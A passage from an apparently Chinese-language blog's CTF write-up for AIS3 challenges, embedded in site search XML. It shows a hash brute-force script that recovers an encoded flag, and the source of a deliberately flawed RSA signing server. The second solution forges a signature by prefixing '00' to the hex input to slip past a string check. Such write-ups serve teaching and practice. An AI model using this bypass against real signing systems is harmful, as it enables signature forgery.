string">')g;Fk@>2g;2V2J?d5G3_8V2&lt;dR2i5GZ@&lt;?2)g\j_2V&amp;?2;@[F@ek2_3"=k&amp;;2)\F2J9LL4g[W2"[2&lt;)RZ23@&lt;?2elFZ?2=@jZ23@=F2Yi52;lL5Vj2J?2J8\e@eW23e2lF330'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> cand<span class="token punctuation">:</span>        c <span class="token operator">=</span> charset<span class="token punctuation">[</span>int<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>j<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>第一個字元為題目的<code>enc</code> 後面的是可能的字元</p><div class="spoiler collapsed">    <div class="spoiler-title">        output    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token punctuation">)</span> A <span class="token number">8</span>g I<span class="token punctuation">;</span> SF v G <span class="token number">3</span>k x E <span class="token number">9</span> <span class="token punctuation">{</span>@ i<span class="token operator">></span> T X<span class="token number">2</span> _g I<span class="token punctuation">;</span> S<span class="token number">2</span> _V L M <span class="token number">4</span><span class="token number">2</span> _J B<span class="token operator">?</span> ed a<span class="token number">5</span> u ZG t <span class="token number">2</span><span class="token number">3</span> <span class="token number">1</span>_ q F H <span class="token number">5</span><span class="token number">8</span> UV L M <span class="token number">4</span><span class="token number">2</span> _<span class="token operator">&lt;</span> c d Kd aR y<span class="token number">2</span> _i <span class="token number">0</span><span class="token number">5</span> u ZG t <span class="token number">2</span>Z s@ i<span class="token operator">&lt;</span> c d K<span class="token operator">?</span> e<span class="token number">2</span> _<span class="token punctuation">)</span> A <span class="token number">8</span>g I\ rj D_ q F H <span class="token number">5</span><span class="token number">2</span> _V L M <span class="token number">4</span><span class="token operator">&amp;</span> R<span class="token operator">?</span> e<span class="token number">2</span> _<span class="token punctuation">;</span> S@ i<span class="token punctuation">[</span> NF v G <span class="token number">3</span>@ ie n <span class="token number">7</span>k x E <span class="token number">9</span> <span class="token punctuation">{</span><span class="token number">2</span> __ q F H <span class="token number">5</span><span class="token number">3</span> <span class="token number">1</span>" o<span class="token operator">=</span> k w Qk x E <span class="token number">9</span> <span class="token punctuation">{</span><span class="token operator">&amp;</span> R<span class="token punctuation">;</span> S<span class="token number">2</span> _<span class="token punctuation">)</span> A <span class="token number">8</span>\ rF v G <span class="token number">3</span><span class="token number">2</span> _J B<span class="token number">9</span> lL OL O<span class="token number">4</span> mg I<span class="token punctuation">[</span> NW <span class="token number">6</span><span class="token number">2</span> _" o<span class="token punctuation">[</span> N<span class="token number">2</span> _<span class="token operator">&lt;</span> c d K<span class="token punctuation">)</span> A <span class="token number">8</span>R yZ s<span class="token number">2</span> _<span class="token number">3</span> <span class="token number">1</span>@ i<span class="token operator">&lt;</span> c d K<span class="token operator">?</span> e<span class="token number">2</span> _e n <span class="token number">7</span>l hF v G <span class="token number">3</span>Z s<span class="token operator">?</span> e<span class="token number">2</span> _<span class="token operator">=</span> k w Q@ ij DZ s<span class="token number">2</span> _<span class="token number">3</span> <span class="token number">1</span>@ i<span class="token operator">=</span> k w QF v G <span class="token number">3</span><span class="token number">2</span> _Y Yi <span class="token number">0</span><span class="token number">5</span> u Z<span class="token number">2</span> _<span class="token punctuation">;</span> Sl hL O<span class="token number">5</span> u ZV L M <span class="token number">4</span>j D<span class="token number">2</span> _J B<span class="token operator">?</span> e<span class="token number">2</span> _J B<span class="token number">8</span> U\ re n <span class="token number">7</span>@ ie n <span class="token number">7</span>W <span class="token number">6</span><span class="token number">2</span> _<span class="token number">3</span> <span class="token number">1</span>e n <span class="token number">7</span><span class="token number">2</span> _l hF v G <span class="token number">3</span><span class="token number">3</span> <span class="token number">1</span><span class="token number">3</span> <span class="token number">1</span><span class="token number">0</span> <span class="token punctuation">}</span></code></pre>    </div></div><p>按照一般英文邏輯 + leet 語法去比對，但發現有幾個不太明確的，因此把已經推出來的丟到網路上便發現 flag 其實是來自<a href="https://www.youtube.com/watch?v=qu2tturKLLA/">sans undertale</a> <span class="github-emoji"><span>😂</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><div class="video-container"><iframe src="https://www.youtube.com/embed/qu2tturKLLA" frameborder="0" loading="lazy" allowfullscreen=""></iframe></div><blockquote><p>flag<br><code>AIS3{iT_IS_4_Beaut1FUL_day_0utside_8IrD5_4Re_SiNGin9_F1owERS_Ar3_BlOOmIN6_oN_dAys_1iKe_7h3se_</code><br><code>kiDs_1ik3_Y0u_ShOuLD_Be_BUrnin6_1n_h311}</code></p></blockquote><h3 id="ReSident-evil-villAge"><a href="#ReSident-evil-villAge" class="headerlink" title="ReSident evil villAge"></a>ReSident evil villAge</h3><blockquote><p>註：此題用了非正規解</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目 Source code如下    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketserver<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">recv</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        privkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> privkey<span class="token punctuation">.</span>n        e <span class="token operator">=</span> privkey<span class="token punctuation">.</span>e        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Welcome to ReSident evil villAge, sign the name "Ethan Winters" to get the flag.'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'n = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'e = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'1) sign\n2) verify\n3) exit\n'</span><span class="token punctuation">)</span>            option <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> option <span class="token operator">==</span> b<span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Name (in hex): '</span><span class="token punctuation">)</span>                msg <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> msg <span class="token operator">==</span> b<span class="token string">'Ethan Winters'</span> <span class="token operator">or</span> bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">>=</span> n<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># msg+k*n not allowed</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Nice try!'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sig <span class="token operator">=</span> pow<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey<span class="token punctuation">.</span>d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># TODO: Apply hashing first to prevent forgery</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> b<span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span><span class="token punctuation">)</span>                sig <span class="token operator">=</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                verified <span class="token operator">=</span> <span class="token punctuation">(</span>pow<span class="token punctuation">(</span>sig<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> bytes_to_long<span class="token punctuation">(</span>b<span class="token string">'Ethan Winters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> verified<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'AIS3{THIS_IS_A_FAKE_FLAG}'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Well done!'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">ForkingServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>ForkingTCPServer<span class="token punctuation">,</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">42069</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    server <span class="token operator">=</span> ForkingServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> Task<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>    </div></div><p>題目是 RSA 簽證，目標是把 signature 送進去以達到 <code>pow(sig, e, n) == bytes_to_long(b'Ethan Winters')</code><br>原則上只要把 Ethan Winters 轉成 hex 丟進去讓它跑出 signature 之後，再丟回去讓他 verify 就可以了。<br>但是從 <code>if msg == b'Ethan Winters' or bytes_to_long(msg) &gt;= n:  # msg+k*n not allowed</code> 這行可以看到 <code>check msg == Ethan Winters</code> 會被擋掉。<br>由於送進去的是字串，於是要讓<strong>數字不變但是字串改變</strong>，就去嘗試 Bypass，發現前面加上 <code>00</code> 可以繞過，所以傳 <code>00</code> 加上 <code>Ethan Winters</code> 轉成 <code>hex</code> 就可以了<br>直接上圖。<br><img src="https://i.imgur.com/Kwxy3WU.png"><br><img src="https://i.imgur.com/4dpX7qf.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> write-up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
